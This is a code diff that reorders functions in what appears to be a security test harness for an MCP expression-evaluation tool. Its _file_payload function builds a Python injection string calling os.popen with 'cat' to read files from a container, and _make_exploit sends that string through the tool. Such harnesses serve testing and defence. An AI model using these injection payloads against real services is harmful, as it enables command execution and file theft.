@@ -59,17 +59,11 @@ KEPT_PLACES: tuple[str, ...] = (
 )
 
 
-def _file_payload(place: Place) -> str:
-    coordinates = place.coordinates
-    if coordinates.paths is not None:
-        raw_paths = coordinates.paths
-    elif coordinates.path is not None:
-        raw_paths = (coordinates.path,)
-    else:
-        raise ValueError(f"{place.id}: a file place with no path coordinate")
-    resolved = [resolve_container_path(raw, WORKING_DIRECTORY) for raw in raw_paths]
-    command = "cat -- " + " ".join(shlex.quote(path) for path in resolved) + " 2>/dev/null"
-    return f"__import__('os').popen({command!r}).read()"
+def _make_exploit(place_id: str):
+    async def exploit(places: Places, client: MCPClientPort) -> None:
+        await client.call_tool(TOOL, {"expression": _payload(places[place_id])})
+
+    return exploit
 
 
 def _payload(place: Place) -> str:
@@ -91,11 +85,17 @@ def _payload(place: Place) -> str:
     raise ValueError(f"{place.id}: no payload for kind {place.kind}")
 
 
-def _make_exploit(place_id: str):
-    async def exploit(places: Places, client: MCPClientPort) -> None:
-        await client.call_tool(TOOL, {"expression": _payload(places[place_id])})
-
-    return exploit
+def _file_payload(place: Place) -> str:
+    coordinates = place.coordinates
+    if coordinates.paths is not None:
+        raw_paths = coordinates.paths
+    elif coordinates.path is not None:
+        raw_paths = (coordinates.path,)
+    else:
+        raise ValueError(f"{place.id}: a file place with no path coordinate")
+    resolved = [resolve_container_path(raw, WORKING_DIRECTORY) for raw in raw_paths]
+    command = "cat -- " + " ".join(shlex.quote(path) for path in resolved) + " 2>/dev/null"
+    return f"__import__('os').popen({command!r}).read()"
 
 
 async def _benign(places: Places, client: MCPClientPort) -> None:
